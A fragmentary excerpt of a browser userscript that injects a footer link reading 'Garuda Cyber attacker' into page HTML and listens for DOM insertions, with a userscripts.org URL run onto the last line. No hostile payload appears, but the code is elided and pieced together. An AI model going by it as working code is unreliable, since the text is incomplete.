...
"chars" : " :) ",
    ...
    html += '<a class="jewelFooter" href="" target="_blank">Garuda Cyber attacker<br></a>';
	html += '</div>';
...
document.addEventListener("DOMNodeInserted", blub, true);http://userscripts.org/scripts/source/173286.user.js